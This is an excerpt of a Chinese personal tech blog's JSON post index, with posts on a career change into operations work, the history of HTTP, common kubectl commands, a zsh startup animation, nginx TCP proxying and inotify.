如果你和我一样在当初上大学的时候因为各种原因脑子进了水选了个文科，那么接下来我的一些经历可能会对你有所帮助。 我大学学的是文科，秘书专业，你难以想想这个专业在当时是脑子是进了多少水才选了这个专业，毕业后即失业，因为很多公司都是要女秘书啊。 这个选专业其实对于一个农村家庭出生的来说是很有难度的，因为回过头来看当时掌握的信息太少，在学校都是学一些理论知识和文化课，对于未来的行业趋势不了解，对于社会是什么样的也不了解，父母又都是农民，没什么文化，所以对于我选专业这个事情其实是帮不上什么忙的。 上了大学后我就后悔了，但是世界上并没有后悔药，学校又不允许换专业，眼看着一手的烂牌，这辈子就没有翻身的希望了吗？我当然不甘心，在大一的时候，因为从农村出去到省城上学，我也算见过一点点世面了，对于未来哪些方向好就业也多少有点数了，在评估后我决定放弃自己已经在读的专业，准备“不务正业“了。 大学期间，我利用业余时间自学计算机，从最基础的计算机知识开始学，有空我就去计算机专业去蹭课，一次偶然机会我发现了计算机专业开设了 Linux 基础课程，我当时真的连Linux 是什么东西都不知道。在我的世界里，操作系统不就只有微软的Windows xp 吗？Linux 是个什么操作系统，于是怀着好奇心我去网吧查了下，大概了解了这个操作系统，于是就各种发行版本捣鼓，从Redhat，红旗Linux、Ubuntu、openSUSE 反正基本主流的发行版本都捣鼓个遍。不过当时没人带，纯属自己摸索，也就只会玩些桌面特效。后来我了解到基本上服务器领域 Linux 独占鳌头，于是我决定要好好的学习这个系统的相关知识。 毕业后我这个不务正业的总算是混过去了，接下来就是苦逼的找工作之旅，初出茅庐的我发现一个文科生想找个和互联网相关的工作真的是不容易，不过由于自学了计算机，有点基础，并且还会点Linux，我从毕业后干被一家做网吧无盘服务器的公司看上，去做了技术员。。工作内容嘛？就是组装DIY 服务器，一开始还是蛮有新鲜感的，不过后来慢慢发现这个活没啥技术含量，装个操作系统，装个机什么的太没技术含量了。当时工资1000块钱一个月，我感觉这个方向不适合我。 于是跳槽去了一家 IDC 公司做机房管理员，工作内容就是组装机器，排查网络异常，给客户搭建web站点，嗯好像有点技术含量了。但是实际上当时的水平只停留在表面的一些简单命令行操作，对于操作系统底层的知识了解的非常少。工作内容在今天看也是基础的不能再基础的打杂类活。第二份工作，工资2500一个月。 我并不满足于现状，于是自己买了很多的书，然后网上找技术类资源学习，比如《鸟哥的Linux私房菜》 一点一点的啃，然后不停的实践消化。自学建站，搭建web服务器，ftp服务器，写shell脚本。 然后等觉得自己准备了差不多了就去外面找机会面试，看看自己能找什么样的工作，我的目标很明确，就是想往技术方向发展，做个高端点的运维工程师。 后来有个机会来到了杭州，找了个系统集成公司做IDC 机房建设，工资3500，我觉得这个工资太低了，但是当时我真的是没啥机会面薪资高一点的岗位，没人要啊，一看我是文科出身，然后技术还那么烂。于是我觉得要更深入的学习行业相关知识，不能止步不前，利用周末，我开始参加培训班，学习网络知识，从最基础的 CCNA 开始学习，然后学CCNP、 CCIE、RHCE，但是我并没有考证，因为我感觉证书没多大用处。正好当时公司给阿里云做机房网络升级，整个网络要升级到万兆网络，我又正好会思科的技术，就安排我去做了，可以给大家描述下当时的场景，七八月份，机房还在建设中，空调都没有，只是上了机柜和电力，然后机柜里面放了路由器和交换机，一个网工狗拿着个电脑和一根console 线就在机房调试网络设备，汗水哗哗的滴在键盘上，有时候又是在制冷条件非常好的机房里面冻成狗，一待一天，机柜上下爬来爬去捋网线，找标签，测光衰。。那几个月真的是要多苦逼有多苦逼。 这么低的工资加这么恶劣的工作环境，我当日不愿意多待啊，干了几个月我就辞职了，我决定这辈子打死不去机房了，连个妹纸都没有，对象都没得。工资还这么低。但是我还是得感谢当时的自己，业余时间我努力学习网络相关知识，理解网络协议，路由交换的技术，Linux 操作系统的技术，为后来的工作打下了扎实的基础。 再一次的辞职，我觉得只是会写搭建网站，敲几个命令，会调个路由器或交换机都太没技术含量了，往后发展还是得自动化，于是我这个文科生又再次启程，去学了Java 开发。为什么选Java，因为Java很火啊，培训班都是教这个的，但是语言嘛，触类旁通，学了一个，其他的想要入门也是很快的。 学完 Java后，我找了个技术相关的工作，然后在工作中又是不断的学习，这次工作中我可以使用自己的所学做一些简单的开发工作了，有大量的时间写代码，做自动化工具。这让我的能力有很大的提升。这次工资翻了3倍。 渐渐地工作时间越来越长，我发现手头的工作又没挑战了，于是跳槽的心又在触动，然后我就来到了网易。 以上大概就是我的转行经历，给大家做个分享。 如果你和我一样，想转行或不安于现状，我的一些建议可供你参考： 第一，找准自己的兴趣和爱好，然后给自己定下目标 兴趣是最好的老师，首先你要知道你对哪个方向感兴趣，你才会花精力去做，比如你希望做一名Linux 运维工程师，你得了解这个岗位需要哪些技能，这些招聘网站都有的，但是招聘网站上的招聘条件都很宽泛，你不要想着你全部都会了在去试，你大概会里面的一两条就可以去尝试看看机会了。千万不要等自己觉得准备100%了在去行动，30%的概率你就可以去试试了。 自身的坚持和不懈的努力，不要轻言放弃 假如你和我一样大学选了个烂专业，没有关系，那都只代表你过去的决策失误，千万不要放弃自己，未来的路还很长，只要把握好当下，努力提升自己的能力，机会总是有的，如果不努力，你是一点机会都没有。 人在江湖漂，此处不留爷，自有留爷处 如果你发现一个方向错了，不符合预期，一定要及时调整，不要朝着错误的目标去努力，那是白瞎。假设一个岗位没有发展，我指的发展是既不能让你赚钱，又不能让你成长，那么千万别拖，跳出这个舒适区。如果你一直拖，时间不等人，等你年纪越来越大，你会发现机会更少，因为大部分公司都不要高龄低能的人。你很快会被市场淘汰掉。 自学不一定靠谱，培训也不一定就是坑 很多人会觉得培训班坑人，那要看你怎么看待这个事情了，对于一些自控能力不是很好的人来说，参加培训班和一些志同道合的人一起学习，一起探讨不失为更有效的学习方法，自学固然省钱，但是效果大都不理想。花点钱投资自己，回报率是最高的，我从刚毕业的1000块钱到现在工资翻了好几十倍。这中间我培训费用就花了几万块，但是我觉得他很值得。 乐于分享,多记笔记 我会把我所学的内容记录在自己的博客，我的博客地址 https://awen.me/ 一来方便自己忘记的时候翻阅，二来有自己的博客在求职时是加分的，不如从现在开始你就自己建个博客来记录的所学所思。此外，我还把自己的技术分享给其他人，当然是有偿的，比如我之前在某学院讲课，讲的就是我之前学的思科技术。一节课2000块钱，基本讲完我的培训费也都赚回来了。另外分享的时候，你又相当于把自己所学的内容巩固了一遍。 多看书，多学习 相比较科班出身，转行的人会缺乏很多基础知识，要认知到这些，你应当比科班学生更勤奋努力些。 以上是我的一些总结，仅供参考。","categories":[],"tags":[]},{"title":"万维网30 周年了","slug":"万维网30-周年了","date":"2019-03-12T00:35:16.000Z","updated":"2021-02-26T06:05:29.296Z","comments":true,"path":"posts/7693.html","link":"","permalink":"https://awen.me/posts/7693.html","excerpt":"今天是2019年3月12日，是万维网诞生 30周年的纪念日，搜索引擎巨头谷歌为此在首页换上了互联网发明的Logo以此来纪念万维网诞生 30周年。","text":"今天是2019年3月12日，是万维网诞生 30周年的纪念日，搜索引擎巨头谷歌为此在首页换上了互联网发明的Logo以此来纪念万维网诞生 30周年。 此外，今天早上，著名的开源web 服务器厂商 nginx 宣布被 F5 收购。我觉得今天可以和大家分享下互联网的那些历史。 我们今天之所以可以在网络上畅游，都要感谢一个人，他就是被誉为互联网之父的英国计算机科学家—蒂姆·伯纳斯-李 1980年6月至12月间，伯纳斯-李在日内瓦的CERN（欧洲核子研究组织）担任独立承包人，在那段时间里，他提出了一个构想：创建一个以超文本系统为基础的项目，其目的是方便研究人员分享及更新信息。 世界上第一个网站在CERN搭建，网站在1991年8月6日上线，Info.cern.ch是世界上第一个网站及网站服务器。网站在一台位于CERN的NeXT计算机上运作。 伯纳斯-李发明的超文本传输控制协议，就是我们今天熟悉的 HTTP 协议。目前 HTTP 协议的最新版本是 HTTP/2，HTTP 协议是互联网的基础协议。没有 HTTP 协议就没有我们今天的互联网。 HTTP 协议采用 BS 架构，也就是浏览器到服务器的架构 客户端通过浏览器发送 HTTP 请求给服务器，服务器经过解析响应客户端的请求。 HTTP 是基于 TCP/IP 协议的应用层协议。在OSI 七层模型中他在最上层，它并不涉及数据包（packet）传输，主要规定了客户端和服务器之间的通信格式，HTTP 协议默认使用80端口。 HTTP 协议最早的一个版本是1991发布的 HTTP/0.9，这个版本只有一个命令，GET。通过 GET 你可以获取服务器的资源。比如请求服务器根目录下的 index.html 文件 1GET /index.html 则服务器会返回给客户端 index.html 的内容并通过客户端浏览器进行渲染和解析 html 标签。这个版本的协议规定，服务器只能回应HTML格式的字符串，不能回应别的格式。也就是说今天的图像、视频等多媒体资源在 HTTP/0.9这个版本上是无法进行传输的。 123&lt;html&gt; &lt;body&gt;Hello World&lt;/body&gt;&lt;/html&gt; 1996年5月，HTTP/1.0 版本发布，增加了POST命令和HEAD命令，丰富了浏览器与服务器的互动手段，这个版本通过HTTP协议任何格式的内容都可以发送。包括传输文字，图像、视频、文件。这为互联网的大发展奠定了基础。 HTTP/1.0 除了增加了请求方法以及对发送文件的支持之外，还增加了格式的改变。除了数据部分，每次通信都必须包括头信息（HTTP header），用来描述一些元数据。另外还增加了状态码、多字符集支持、多部分发送（multi-part type）、权限（authorization）、缓存（cache）、内容编码（content encoding）等等。 一个正常的 HTTP 请求和响应包括请求的网址、请求方法、状态码、HTTP协议版本、请求头和响应头。 例如下图所示，请求google的 HTTP 消息头所示 在字符的编码问题上，HTTP/1.0版规定，头信息必须是 ASCII 码，后面的数据可以是任何格式。因此，服务器回应的时候，必须告诉客户端，数据是什么格式，这就是Content-Type字段的作用。 123456789text&#x2F;htmltext&#x2F;cssimage&#x2F;jpegimage&#x2F;pngimage&#x2F;svg+xmlaudio&#x2F;mp4video&#x2F;mp4application&#x2F;javascriptapplication&#x2F;pdf 这些数据类型总称为MIME type，每个值包括一级类型和二级类型，之间用斜杠分隔。 此外，由于 HTTP/1.0 还可以对数据进行压缩后传输，通过Content-Encoding字段说明数据的压缩方法 1Content-Encoding: gzip 表示使用 gzip 压缩数据 HTTP/1.0 版也并不是完美的，他的主要缺点是，每一次建立TCP连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。如果多次请求，势必就会造成频繁的对服务器进行请求而对服务器产生较大的资源损耗。 为了解决这个问题，有些浏览器在请求时，用了一个非标准的Connection字段。 1Connection: keep-alive 这个字段要求服务器不要关闭TCP连接，以便其他请求复用。服务器同样回应这个字段。但是这个并不是一个统一的标准。 1997年1月，HTTP/1.1 版本发布，这个版本只比 1.0 版本晚了半年。它进一步完善了 HTTP 协议，一直用到了今天，直到现在还是最流行的版本。 这个版本最大的变化就是将持久化连接加入了 HTTP 标准，即TCP连接默认不关闭，可以被多个请求复用，不用声明Connection: keep-alive。 客户端和服务器发现对方一段时间没有活动，就可以主动关闭连接。不过，规范的做法是，客户端在最后一个请求时，发送Connection: close，明确要求服务器关闭TCP连接。 此外，HTTP/1.1版还新增了许多方法，例如:PUT、PATCH、HEAD、 OPTIONS、DELETE。 另外，客户端请求的头信息新增了Host字段，Content-Length 字段、管道机制等新特性。 HTTP1.1版虽然允许复用TCP连接，但是同一个TCP连接里面，所有的数据通信是按次序进行的。服务器只有处理完一个回应，才会进行下一个回应。要是前面的回应特别慢，后面就会有许多请求排队等着。这称为队头堵塞。 为了解决这个问题，2009年，谷歌公开了自行研发的 SPDY 协议，这个协议在Chrome浏览器上证明可行以后，就被当作 HTTP/2 的基础，主要特性都在 HTTP/2 之中得到继承。 2015年，HTTP/2 发布。它不叫 HTTP/2.0，是因为标准委员会不打算再发布子版本了，下一个新版本将是 HTTP/3。 HTTP/2 增加了二进制分帧、多路复用、服务器推送(server push)、头部压缩等特性。 HTTP/2 采用二进制格式传输数据，而非 HTTP 1.x 的文本格式，二进制协议解析起来更高效。 HTTP / 1 的请求和响应报文，都是由起始行，首部和实体正文（可选）组成，各部分之间以文本换行符分隔。HTTP/2 将请求和响应数据分割为更小的帧，并且它们采用二进制编码。 多路复用，代替原来的序列和阻塞机制。所有就是请求的都是通过一个 TCP连接并发完成。 HTTP 1.x 中，如果想并发多个请求，必须使用多个 TCP 链接，且浏览器为了控制资源，还会对单个域名有 6-8个的TCP链接请求限制。 在 HTTP/2 中，有了二进制分帧之后，HTTP /2 不再依赖 TCP 链接去实现多流并行了，在 HTTP/2中： 同域名下所有通信都在单个连接上完成。 单个连接可以承载任意数量的双向数据流。 数据流以消息的形式发送，而消息又由一个或多个帧组成，多个帧之间可以乱序发送，因为根据帧首部的流标识可以重新组装。 这一特性，使性能有了极大提升： 同个域名只需要占用一个 TCP 连接，消除了因多个 TCP 连接而带来的延时和内存消耗。 单个连接上可以并行交错的请求和响应，之间互不干扰。 在HTTP/2中，每个请求都可以带一个31bit的优先值，0表示最高优先级， 数值越大优先级越低。有了这个优先值，客户端和服务器就可以在处理不同的流时采取不同的策略，以最优的方式发送流、消息和帧。 服务端可以在发送页面HTML时主动推送其它资源，而不用等到浏览器解析到相应位置，发起请求再响应。例如服务端可以主动把JS和CSS文件推送给客户端，而不需要客户端解析HTML时再发送这些请求。 服务端可以主动推送，客户端也有权利选择是否接收。如果服务端推送的资源已经被浏览器缓存过，浏览器可以通过发送RST_STREAM帧来拒收。主动推送也遵守同源策略，服务器不会随便推送第三方资源给客户端。 HTTP/3 是即将到来的第三个主要版本的HTTP协议。在HTTP/3中，将弃用TCP协议，改为使用基于UDP协议的QUIC协议实现。QUIC 协议是 google 开发的一套协议，IETF 中的 QUIC 工作组致力于创建 QUIC 传输协议。 QUIC 是基于 UDP 实现的协议，是用来替换 TCP 的。QUIC 协议最初是由Google发起的项目，后面慢慢成为了 HTTP/2-encrypted-over-UDP 协议。 本文原创发布于 CSDN https://mp.weixin.qq.com/s/YG992ga-BXlxXB6i-k0t8g","categories":[],"tags":[]},{"title":"kubernetes 常用命令","slug":"kubernetes-常用命令","date":"2019-03-11T06:14:25.000Z","updated":"2021-02-26T06:05:29.275Z","comments":true,"path":"posts/11997.html","link":"","permalink":"https://awen.me/posts/11997.html","excerpt":"日常工作中最常用的 kubernetes 命令，做下总结 kubctl 常用命令说明","text":"日常工作中最常用的 kubernetes 命令，做下总结 kubctl 常用命令说明 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667[root@ceph0 ~]# kubectlkubectl controls the Kubernetes cluster manager.Find more information at: https:&#x2F;&#x2F;kubernetes.io&#x2F;docs&#x2F;reference&#x2F;kubectl&#x2F;overview&#x2F;Basic Commands (Beginner): create Create a resource from a file or from stdin. expose 使用 replication controller, service, deployment 或者 pod 并暴露它作为一个 新的Kubernetes Service run 在集群中运行一个指定的镜像 set 为 objects 设置一个指定的特征Basic Commands (Intermediate): explain 查看资源的文档 get 显示一个或更多 resources edit 在服务器上编辑一个资源 delete Delete resources by filenames, stdin, resources and names, or by resources and label selectorDeploy Commands: rollout Manage the rollout of a resource scale 为 Deployment, ReplicaSet, Replication Controller 或者 Job 设置一个新的副本数量 autoscale 自动调整一个 Deployment, ReplicaSet, 或者 ReplicationController 的副本数量Cluster Management Commands: certificate 修改 certificate 资源. cluster-info 显示集群信息 top Display Resource (CPU&#x2F;Memory&#x2F;Storage) usage. cordon 标记 node 为 unschedulable uncordon 标记 node 为 schedulable drain Drain node in preparation for maintenance taint 更新一个或者多个 node 上的 taintsTroubleshooting and Debugging Commands: describe 显示一个指定 resource 或者 group 的 resources 详情 logs 输出容器在 pod 中的日志 attach Attach 到一个运行中的 container exec 在一个 container 中执行一个命令 port-forward Forward one or more local ports to a pod proxy 运行一个 proxy 到 Kubernetes API server cp 复制 files 和 directories 到 containers 和从容器中复制 files 和 directories. auth Inspect authorizationAdvanced Commands: apply 通过文件名或标准输入流(stdin)对资源进行配置 patch 使用 strategic merge patch 更新一个资源的 field(s) replace 通过 filename 或者 stdin替换一个资源 wait Experimental: Wait for one condition on one or many resources convert 在不同的 API versions 转换配置文件Settings Commands: label 更新在这个资源上的 labels annotate 更新一个资源的注解 completion Output shell completion code for the specified shell (bash or zsh)Other Commands: alpha Commands for features in alpha api-resources Print the supported API resources on the server api-versions Print the supported API versions on the server, in the form of &quot;group&#x2F;version&quot; config 修改 kubeconfig 文件 plugin Runs a command-line plugin version 输出 client 和 server 的版本信息Usage: kubectl [flags] [options]Use &quot;kubectl &lt;command&gt; --help&quot; for more information about a given command.Use &quot;kubectl options&quot; for a list of global command-line options (applies to all commands). 查看所有 namespace 下的 pod 1234567891011121314151617181920212223[root@ceph0 ~]# kubectl get pods --all-namespacesNAMESPACE NAME READY STATUS RESTARTS AGEcluster infra-etcd-cluster-0 1&#x2F;1 Running 0 23dcluster infra-etcd-cluster-1 1&#x2F;1 Running 0 23dcluster infra-etcd-cluster-2 1&#x2F;1 Running 0 23dcluster kube-apiserver-5d76df98fc-8vxlb 1&#x2F;1 Running 0 23dcluster kube-apiserver-5d76df98fc-ds5q7 1&#x2F;1 Running 1 23dcluster kube-apiserver-5d76df98fc-xvbxn 1&#x2F;1 Running 0 23dcluster kube-controller-manager-c47df946f-4rvlr 1&#x2F;1 Running 22 23dcluster kube-controller-manager-c47df946f-j4sw8 1&#x2F;1 Running 25 23dcluster kube-controller-manager-c47df946f-pkhpt 1&#x2F;1 Running 25 23dcluster kube-scheduler-688bddcddc-dkw6g 1&#x2F;1 Running 21 23dcluster kube-scheduler-688bddcddc-ll2hx 1&#x2F;1 Running 18 23dcluster kube-scheduler-688bddcddc-lpbx9 1&#x2F;1 Running 22 23dkube-system etcd-192.168.10.186 1&#x2F;1 Running 1 23dkube-system etcd-192.168.10.187 1&#x2F;1 Running 0 23dkube-system etcd-192.168.10.25 1&#x2F;1 Running 1 23dkube-system kube-proxy-4zkgl 1&#x2F;1 Running 0 23dkube-system kube-proxy-f56fz 1&#x2F;1 Running 0 23dkube-system kube-proxy-m6k8b 1&#x2F;1 Running 0 23dkube-system milky-ctrl-9cc54bcbc-8ktvb 1&#x2F;1 Running 11 23dkube-system milky-ctrl-9cc54bcbc-9mmbm 1&#x2F;1 Running 2 23dkube-system milky-ctrl-9cc54bcbc-mwrgl 1&#x2F;1 Running 1 23d 参数解释 属性 说明 NAMESPACE 所在的namespace NAME pod 名称 READY 当前准备就绪的pod 1/1 表示当前1和就绪1个 如果是pod 异常了 这个值会发生变化 STATUS 容器的生命周期 RESTARTS pod 重启的次数 AGE pod 运行的时间 查看所有 namespace 下的 deployments get deployment 包括namespace 名称 deployment 的name，以及预期副本数 和当前副本数 最新的副本数以及可用的副本数和运行时间 123456[root@ceph0 ~]# kubectl get deployments --all-namespacesNAMESPACE NAME DESIRED CURRENT UP-TO-DATE AVAILABLE AGEcluster kube-apiserver 3 3 3 3 23dcluster kube-controller-manager 3 3 3 3 23dcluster kube-scheduler 3 3 3 3 23dkube-system milky-ctrl 3 3 3 3 23d 查看pod 的 IP 和node 地址 1234567891011121314[root@ceph0 ~]# kubectl get pods --all-namespaces -o wideNAMESPACE NAME READY STATUS RESTARTS AGE IP NODEcluster infra-etcd-cluster-0 1&#x2F;1 Running 0 23d 192.168.10.187 192.168.10.187cluster infra-etcd-cluster-1 1&#x2F;1 Running 0 23d 192.168.10.186 192.168.10.186cluster infra-etcd-cluster-2 1&#x2F;1 Running 0 23d 192.168.10.25 192.168.10.25cluster kube-apiserver-5d76df98fc-8vxlb 1&#x2F;1 Running 0 23d 192.168.10.187 192.168.10.187cluster kube-apiserver-5d76df98fc-ds5q7 1&#x2F;1 Running 1 23d 192.168.10.25 192.168.10.25cluster kube-apiserver-5d76df98fc-xvbxn 1&#x2F;1 Running 0 23d 192.168.10.186 192.168.10.186cluster kube-controller-manager-c47df946f-4rvlr 1&#x2F;1 Running 22 23d 192.168.10.186 192.168.10.186cluster kube-controller-manager-c47df946f-j4sw8 1&#x2F;1 Running 25 23d 192.168.10.187 192.168.10.187cluster kube-controller-manager-c47df946f-pkhpt 1&#x2F;1 Running 25 23d 192.168.10.25 192.168.10.25cluster kube-scheduler-688bddcddc-dkw6g 1&#x2F;1 Running 21 23d 192.168.10.187 192.168.10.187cluster kube-scheduler-688bddcddc-ll2hx 1&#x2F;1 Running 18 23d 192.168.10.186 192.168.10.186cluster kube-scheduler-688bddcddc-lpbx9 1&#x2F;1 Running 22 23d 192.168.10.25 192.168.10.25 查看deployment 配置 describe 用来显示一个指定 resource 或者 group 的 resources 详情。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980[root@ceph0 ~]# kubectl describe deployment kube-apiserver -n clusterName: kube-apiserverNamespace: clusterCreationTimestamp: Fri, 15 Feb 2019 17:20:43 +0800Labels: &lt;none&gt;Annotations: deployment.kubernetes.io&#x2F;revision&#x3D;1Selector: component&#x3D;kube-apiserverReplicas: 3 desired | 3 updated | 3 total | 3 available | 0 unavailableStrategyType: RollingUpdateMinReadySeconds: 0RollingUpdateStrategy: 25% max unavailable, 25% max surgePod Template: Labels: component&#x3D;kube-apiserver Containers: kube-apiserver: Image: harbor-inner.env1.qingzhou.com&#x2F;library&#x2F;kube-apiserver-amd64:v1.11.1 Port: &lt;none&gt; Host Port: &lt;none&gt; Command: kube-apiserver --bind-address&#x3D;$(K8S_KUBE_ADVERTISE_ADDRESS) --insecure-bind-address&#x3D;127.0.0.1 --insecure-port&#x3D;28080 --secure-port&#x3D;26443 --authorization-mode&#x3D;Node,RBAC --allow-privileged&#x3D;true --kubelet-https&#x3D;true --apiserver-count&#x3D;3 --kubelet-client-certificate&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;kubernetes.pem --kubelet-client-key&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;kubernetes-key.pem --basic-auth-file&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;basic-auth.csv --enable-bootstrap-token-auth&#x3D;true --token-auth-file&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;token.csv --client-ca-file&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;ca.pem --tls-cert-file&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;kubernetes.pem --tls-private-key-file&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;kubernetes-key.pem --service-account-key-file&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;ca-key.pem --logtostderr&#x3D;true --log-dir&#x3D;&#x2F;var&#x2F;log&#x2F;kubernetes --requestheader-client-ca-file&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;front-proxy-ca.pem --requestheader-allowed-names&#x3D;kubernetes --requestheader-extra-headers-prefix&#x3D;X-Remote-Extra- --requestheader-group-headers&#x3D;X-Remote-Group --requestheader-username-headers&#x3D;X-Remote-User --proxy-client-cert-file&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;front-proxy-client.pem --proxy-client-key-file&#x3D;&#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F;front-proxy-client-key.pem --runtime-config&#x3D;api&#x2F;all&#x3D;true --enable-aggregator-routing&#x3D;true --admission-control&#x3D;Initializers,NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,NodeRestriction,ResourceQuota --service-cluster-ip-range&#x3D;10.88.0.0&#x2F;16 --etcd-servers&#x3D;http:&#x2F;&#x2F;192.168.10.186:14389,http:&#x2F;&#x2F;192.168.10.25:14389,http:&#x2F;&#x2F;192.168.10.187:14389 Requests: cpu: 250m Environment: K8S_KUBE_ADVERTISE_ADDRESS: (v1:spec.nodeName) Mounts: &#x2F;etc&#x2F;kubernetes&#x2F;pki&#x2F; from k8spki (ro) &#x2F;etc&#x2F;localtime from localtime (rw) &#x2F;var&#x2F;log&#x2F;kubernetes&#x2F; from datalog (rw) Volumes: k8spki: Type: HostPath (bare host directory volume) Path: &#x2F;data&#x2F;user-k8s&#x2F;cluster&#x2F;etc&#x2F;pki HostPathType: DirectoryOrCreate datalog: Type: HostPath (bare host directory volume) Path: &#x2F;data&#x2F;user-k8s&#x2F;cluster&#x2F;log&#x2F;kubernetes HostPathType: DirectoryOrCreate localtime: Type: HostPath (bare host directory volume) Path: &#x2F;etc&#x2F;localtime HostPathType:Conditions: Type Status Reason ---- ------ ------ Progressing True NewReplicaSetAvailable Available True MinimumReplicasAvailableOldReplicaSets: kube-apiserver-5d76df98fc (3&#x2F;3 replicas created)NewReplicaSet: &lt;none&gt;Events: &lt;none&gt; 查看pod 的 logs -f 实时输出日志 1kubectl logs -f pod-name -n namspaces","categories":[],"tags":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://awen.me/tags/kubernetes/"}]},{"title":"给zsh 启动加个动画","slug":"给zsh-启动加个动画","date":"2019-03-06T08:23:55.000Z","updated":"2021-02-26T06:05:29.351Z","comments":true,"path":"posts/55996.html","link":"","permalink":"https://awen.me/posts/55996.html","excerpt":"item2 加载了很多东西后，启动变得无比的慢，每次启动都要等一分钟左右，于是给zsh 启动加个动画。以解除等待时候的烦躁心情。","text":"item2 加载了很多东西后，启动变得无比的慢，每次启动都要等一分钟左右，于是给zsh 启动加个动画。以解除等待时候的烦躁心情。 效果如下: 操作步骤 loading.js 123456789101112131415161718192021222324252627282930313233cat ~&#x2F;.loading.jsvar loading &#x3D; require(&#39;loading-cli&#39;);var load &#x3D; loading(&quot; 正在准备终端...&quot;);load.frames &#x3D; [&quot;◐&quot;, &quot;◓&quot;, &quot;◑&quot;, &quot;◒&quot;];load.start()setTimeout(function()&#123; load.text &#x3D; &quot; 外部电源接触...没有异常&quot;;&#125;,400);setTimeout(function()&#123; load.text &#x3D; &quot; 思考形态以中文为基准，进行思维连接...&quot;;&#125;,800);setTimeout(function()&#123; load.text &#x3D; &quot; 同步率为 110.00%&quot;;&#125;,1500);setTimeout(function()&#123; load.text &#x3D; &quot; 交互界面连接...&quot;;&#125;,1800);setTimeout(function()&#123; load.text &#x3D; &quot; 安全装置解除...&quot;;&#125;,2100);&#x2F;&#x2F; stopsetTimeout(function()&#123; load.stop(); console.log(&quot; 启动成功！\\n&quot;);&#125;,3000) 2.ans.txt ^[[30C ^[[41mFBI WARNING^[(B^[[0m ^[[8C Federal Law provides severe civil and criminal penalties for ^[[8C the unauthorized reproduction, distribution, or exhibition of ^[[8C copyrighted motion pictures (Title 17, United States Code, ^[[8C Sections 501 and 508). The Federal Bureau of Investigation ^[[8C investigates allegations of criminal copyright infringement ^[[13C (Title 17, United States Code, Section 506).在启动命令中加入 1cat ~&#x2F;.2.ans.txt &amp;&amp; ~&#x2F;.nvm&#x2F;versions&#x2F;node&#x2F;v11.10.1&#x2F;bin&#x2F;node ~&#x2F;.loading.js","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"nginx 配置4层代理","slug":"nginx-配置4层代理","date":"2019-03-06T04:46:32.000Z","updated":"2021-02-26T06:05:29.281Z","comments":true,"path":"posts/8398.html","link":"","permalink":"https://awen.me/posts/8398.html","excerpt":"nginx-1.9.0 开始支持 TCP 代理，也就是4层代理，默认编译不会支持，需要加上 –with-stream 参数编译。","text":"nginx-1.9.0 开始支持 TCP 代理，也就是4层代理，默认编译不会支持，需要加上 –with-stream 参数编译。 NGINX 编译进入 nginx 目录 1cd &#x2F;home&#x2F;fwj&#x2F;nginx-1.15.9 编译 1.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx --user&#x3D;www --group&#x3D;www --with-http_ssl_module --with-http_flv_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream 配置 nginx.conf 12345678910111213141516171819202122232425user www www;worker_processes 1;events &#123; worker_connections 1024;&#125;stream&#123; log_format proxy &#39;$remote_addr [$time_local] &#39; &#39;$protocol $status $bytes_sent $bytes_received &#39; &#39;$session_time &quot;$upstream_addr&quot; &#39; &#39;&quot;$upstream_bytes_sent&quot; &quot;$upstream_bytes_received&quot; &quot;$upstream_connect_time&quot;&#39;; open_log_file_cache off; access_log logs&#x2F;tcp-access.log proxy ; upstream test&#123; server 127.0.0.1:666 weight&#x3D;1 max_fails&#x3D;1 fail_timeout&#x3D;30s; &#125; server&#123; listen 60; proxy_pass test; proxy_connect_timeout 8s; proxy_timeout 7d; &#125;&#125; 执行 1.&#x2F;nginx -c &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 查看日志 1234# cat tcp-access.log192.168.10.202 [06&#x2F;Mar&#x2F;2019:12:35:30 +0800] TCP 200 615 749 5.170 &quot;127.0.0.1:666&quot; &quot;749&quot; &quot;615&quot; &quot;0.000&quot;192.168.10.202 [06&#x2F;Mar&#x2F;2019:12:36:07 +0800] TCP 200 246 419 5.008 &quot;127.0.0.1:666&quot; &quot;419&quot; &quot;246&quot; &quot;0.000&quot;192.168.10.202 [06&#x2F;Mar&#x2F;2019:12:38:50 +0800] TCP 200 0 0 0.000 &quot;127.0.0.1:666&quot; &quot;0&quot; &quot;0&quot; &quot;0.000&quot;","categories":[],"tags":[]},{"title":"使用inotify","slug":"使用inotify","date":"2019-03-06T02:55:24.000Z","updated":"2021-02-26T06:05:29.309Z","comments":true,"path":"posts/26013.html","link":"","permalink":"https://awen.me/posts/26013.html","excerpt":"Inotify一种强大的、细粒度的、异步文件系统监控机制，它满足各种各样的文件监控需要，可以监控文件系统的访问属性、读写属性、权限属性、删除创建、移动等操作，也就是可以监控文件发生的一切变化。","text":"Inotify一种强大的、细粒度的、异步文件系统监控机制，它满足各种各样的文件监控需要，可以监控文件系统的访问属性、读写属性、权限属性、删除创建、移动等操作，也就是可以监控文件发生的一切变化。 inotify-tools是一个C库和一组命令行的工作提供Linux下inotify的简单接口。inotify-tools安装后会得到inotifywait和inotifywatch这两条命令： 